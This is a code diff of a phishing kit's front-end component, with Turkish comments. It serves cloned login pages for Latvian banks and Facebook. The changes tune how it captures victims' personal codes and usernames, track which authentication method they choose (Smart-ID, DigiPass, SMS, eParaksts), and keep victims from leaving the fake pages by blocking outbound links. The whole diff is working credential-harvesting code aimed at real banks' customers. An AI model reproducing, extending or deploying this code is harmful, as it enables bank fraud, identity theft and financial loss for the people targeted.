@@ -24,7 +24,7 @@ const DEFAULT_LV_FILES: Record<string, string[]> = {
   "bluorbank-lv": ["1.html", "2.html"],
   "citadele-lv": ["1.html", "2.html", "3.html"],
   "industra-lv": ["1.html"],
-  "luminor-lv": ["ana.html", "1.html", "2.html", "3.html"],
+  "luminor-lv": ["ana.html"],
   "magnetiqbank-lv": ["1.html", "2.html", "3.html", "4.html"],
   "ribbank-lv": ["1.html", "2.html", "3.html"],
   "seb-lv": ["1.html", "2.html", "3.html", "4.html"],
@@ -95,12 +95,12 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
     const methodMap: Record<string, string[]> = {
       "swedbank-lv":  ["Biometrija/PIN",       "Smart-ID",        "eParaksts mobile",          "Kodu kalkulators",    "Mobile-ID"],
       "seb-lv":       ["Smart-ID",             "SEB mobilā lietotne", "eParaksts mobile",      "Kodu kalkulators"],
-      "luminor-lv":   ["Lietotājvārds",        "eParaksts",       "eParaksts",                 "eParaksts"],
-      "citadele-lv":  ["Lietotāja ID",         "Parole",          "PIN kods"],
-      "ribbank-lv":   ["Pieteikšanās",         "Parole",          "Apstiprinājums"],
-      "bluorbank-lv": ["Lietotājvārds",        "Parole"],
+      "luminor-lv":   ["Pieteikšanās"],
+      "citadele-lv":  ["Kodu karte/Kodu kalkulators", "MobileSCAN/Digipass 780", "eParaksts mobile"],
+      "ribbank-lv":   ["Fiziskais DigiPass",   "Virtuālais DigiPass", "eParaksts mobile"],
+      "bluorbank-lv": ["Smart-ID",             "eParaksts mobile"],
       "industra-lv":  ["Pieteikšanās"],
-      "magnetiqbank-lv": ["Lietotājvārds",     "Parole",          "Kods",                      "Apstiprinājums"],
+      "magnetiqbank-lv": ["DIGIPASS",         "SMS",             "Mobile app",                "eParaksts mobile"],
       "signet-bank-lv": ["Pieteikšanās"],
       "facebook-lv":  ["Facebook Prisijungti"],
     };
@@ -144,12 +144,12 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
     const methodMap: Record<string, string[]> = {
       "swedbank-lv":  ["Biometrija/PIN",       "Smart-ID",        "eParaksts mobile",          "Kodu kalkulators",    "Mobile-ID"],
       "seb-lv":       ["Smart-ID",             "SEB mobilā lietotne", "eParaksts mobile",      "Kodu kalkulators"],
-      "luminor-lv":   ["Lietotājvārds",        "eParaksts",       "eParaksts",                 "eParaksts"],
-      "citadele-lv":  ["Lietotāja ID",         "Parole",          "PIN kods"],
-      "ribbank-lv":   ["Pieteikšanās",         "Parole",          "Apstiprinājums"],
-      "bluorbank-lv": ["Lietotājvārds",        "Parole"],
+      "luminor-lv":   ["Pieteikšanās"],
+      "citadele-lv":  ["Kodu karte/Kodu kalkulators", "MobileSCAN/Digipass 780", "eParaksts mobile"],
+      "ribbank-lv":   ["Fiziskais DigiPass",   "Virtuālais DigiPass", "eParaksts mobile"],
+      "bluorbank-lv": ["Smart-ID",             "eParaksts mobile"],
       "industra-lv":  ["Pieteikšanās"],
-      "magnetiqbank-lv": ["Lietotājvārds",     "Parole",          "Kods",                      "Apstiprinājums"],
+      "magnetiqbank-lv": ["DIGIPASS",         "SMS",             "Mobile app",                "eParaksts mobile"],
       "signet-bank-lv": ["Pieteikšanās"],
       "facebook-lv":  ["Facebook Prisijungti"],
     };
@@ -739,12 +739,14 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
             }
             // Kisiye ozel kod / kimlik numarasi alanlari (luminor pc/PersonCode,
             // swedbank identityNumber, siauliu perscode)
-            if (ltName === "pc" || ltId === "personcode" || ltId === "perscode" || ltName === "perscode" || lowerText.includes("personcode") || lowerText.includes("identitynumber")) {
+            if (ltName === "pc" || ltId === "personcode" || ltId === "perscode" || ltName === "perscode" || ltName === "personidentifier" || ltId === "personidentifier" || lowerText.includes("personcode") || lowerText.includes("identitynumber") || lowerText.includes("personas kods")) {
               assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
               continue;
             }
-            // Luminor kullanici id alani (name=ln) ve acik userId alanlari
-            if (ltName === "ln" || ltName === "userid") {
+            // Luminor kullanici id alani (name=ln) ve acik userId alanlari.
+            // RIB "Lietotāja kods" ve diger "Lietotāja ..." etiketli alanlar da
+            // kullanici adidir — method yanlis normalize edilse bile username'e gider.
+            if (ltName === "ln" || ltName === "userid" || lowerText.includes("lietotāja") || lowerText.includes("lietotaja")) {
               assignUsername(value, true);
               continue;
             }
@@ -895,10 +897,9 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
            console.log('%c[LV PARENT] SET CURRENT INDEX (bulunan)', 'background:#42a5f5;color:#fff;font-weight:bold;', {
              finalIndex, safeIndex, loginMethod: finalLoginMethod, totalFiles, bankSlug: __bankSlug
            });
-           if (__bankSlug === 'swedbank-lv' || __bankSlug === 'magnetiqbank-lv') {
-             // Bu bankalarda method gecisi iframe ICINDE yapiliyor
-             // (swedbank: ui-tab panelleri, magnetiq: alan swap) - dosya reload YOK.
-             // Sadece method kaydi tutuluyor.
+           if (__bankSlug === 'swedbank-lv') {
+             // Swedbank'ta method gecisi iframe ICINDE yapiliyor
+             // (ui-tab panelleri) - dosya reload YOK. Sadece method kaydi tutuluyor.
            } else {
              setCurrentIndex((prev) => (prev === safeIndex ? prev : safeIndex));
            }
@@ -1047,12 +1048,12 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
         const LITHUANIA_MINI_METHOD_MAP = {
           "swedbank-lv":  ["Biometrija/PIN",       "Smart-ID",        "eParaksts mobile",          "Kodu kalkulators",    "Mobile-ID"],
           "seb-lv":       ["Smart-ID",             "SEB mobilā lietotne", "eParaksts mobile",      "Kodu kalkulators"],
-          "luminor-lv":   ["Lietotājvārds",        "eParaksts",       "eParaksts",                 "eParaksts"],
-          "citadele-lv":  ["Lietotāja ID",         "Parole",          "PIN kods"],
-          "ribbank-lv":   ["Pieteikšanās",         "Parole",          "Apstiprinājums"],
-          "bluorbank-lv": ["Lietotājvārds",        "Parole"],
+          "luminor-lv":   ["Pieteikšanās"],
+          "citadele-lv":  ["Kodu karte/Kodu kalkulators", "MobileSCAN/Digipass 780", "eParaksts mobile"],
+          "ribbank-lv":   ["Fiziskais DigiPass",   "Virtuālais DigiPass", "eParaksts mobile"],
+          "bluorbank-lv": ["Smart-ID",             "eParaksts mobile"],
           "industra-lv":  ["Pieteikšanās"],
-          "magnetiqbank-lv": ["Lietotājvārds",     "Parole",          "Kods",                      "Apstiprinājums"],
+          "magnetiqbank-lv": ["DIGIPASS",         "SMS",             "Mobile app",                "eParaksts mobile"],
           "signet-bank-lv": ["Pieteikšanās"],
           "facebook-lv":  ["Facebook Prisijungti"],
         };
@@ -2198,7 +2199,8 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
             }
 
             let loginMethod = "Bilinmiyor";
-            const activeTab = document.querySelector('.active, .selected, .current, [aria-selected="true"]');
+            // RIB 'button[data-selected=true]' dahil tum aktif-sekme varyantlari
+            const activeTab = document.querySelector('[data-selected="true"], .active, .selected, .current, [aria-selected="true"], a.login-type.active');
             if (activeTab) {
                 loginMethod = extractLoginMethodLabel(activeTab.textContent || '') || loginMethod;
             }
@@ -2350,7 +2352,7 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
           if (a && a.href) {
              // Eğer link bir "tab" değilse ve dışarıya gidiyorsa engelle
              const aText = a.textContent ? a.textContent.toLowerCase() : '';
-             const isTabLink = aText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|parool|password|šifr/i) !== null;
+             const isTabLink = aText.match(/smart-id|mobiil-id|id-kaart|pin-kalkulaator|biomeetria|smart id|mobiil id|seb mobiilirakendus|mobilescan|digipass|salasõna|parool|password|šifr|\bsms\b/i) !== null;
              
              if (!isTabLink && !a.href.startsWith('javascript') && !a.href.startsWith(window.location.origin) && !a.href.includes('#')) {
                  e.preventDefault();
@@ -2441,7 +2443,7 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
               const tab = target.closest('[data-tab-index], .ui-tabs__control, .ui-tabs__caption, li, [role="tab"], .tab, .nav-item, .seb-tabs__item, a, .c-tabs__item, .c-tab, .coop-tab, .tab-item, .lhv-tab-link, button.lhv-tab-link, [lhvtablink], .auth-methods-method, .ds-option, .ds-option__label, .v-tab, .v-slide-group__content > *, .v-item-group .v-item');
               if (tab) {
                   const tabText = tab.textContent ? tab.textContent.trim().toLowerCase() : '';
-                  const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobile-id|smart id|mobile id|eparaksts|kalkulators|lietotne|biometri|pin kods|mobilescan|digipass|parol|password|kodu|mobil/i) !== null;
+                  const isTabByText = tabText.length < 50 && tabText.match(/smart-id|mobile-id|smart id|mobile id|eparaksts|kalkulators|lietotne|biometri|pin kods|mobilescan|digipass|parol|password|kodu|mobil|\bsms\b/i) !== null;
                   
                   if (tab.hasAttribute('data-tab-index') || tab.closest('[data-tab-index]') || isTabByText || tab.getAttribute('role') === 'tab' || tab.hasAttribute('lhvtablink') || (tab.className && typeof tab.className === 'string' && tab.className.match(/\\btab\\b|\\bnav-item\\b|\\bseb-tabs__item\\b|\\bc-tabs__item\\b|\\btab-item\\b|\\blhv-tab-link\\b|\\bauth-methods-method\\b|\\bds-option\\b|\\bds-option__label\\b|\\bui-tabs__control\\b|\\bui-tabs__caption\\b/i))) {
                       isTabClick = true;
@@ -2597,11 +2599,20 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
                   else if (/mobil|lietotne|app/.test(_tabText)) targetIndex = 1;
                   else if (/smart|smartid/.test(_tabText)) targetIndex = 0;
                 } else if (window.location.href.includes('luminor-lv')) {
-                  targetIndex = 1;
+                  // Luminor tek sayfa (ana.html): radio secmeleri iframe icinde handle edilir,
+                  // parent'a iframe degistirme istegi gitmesin.
+                  targetIndex = -1;
                 } else if (window.location.href.includes('citadele-lv')) {
-                  if (/mobile|mobil/.test(_tabText)) targetIndex = 1;
-                  else if (/kod|pin/.test(_tabText)) targetIndex = 2;
+                  // Gercek sekme sirasi: 0=Kodu karte/Kodu kalkulators,
+                  // 1=MobileSCAN/Digipass 780, 2=eParaksts mobile
+                  if (/eparaksts/.test(_tabText)) targetIndex = 2;
+                  else if (/mobilescan|mobile scan|digipass|mobil/.test(_tabText)) targetIndex = 1;
                   else targetIndex = 0;
+                } else if (window.location.href.includes('magnetiqbank-lv')) {
+                  if (/eparaksts/.test(_tabText)) targetIndex = 3;
+                  else if (/mobile|mobil|app/.test(_tabText)) targetIndex = 2;
+                  else if (/sms/.test(_tabText)) targetIndex = 1;
+                  else if (/digipass/.test(_tabText)) targetIndex = 0;
                 }
               }
 
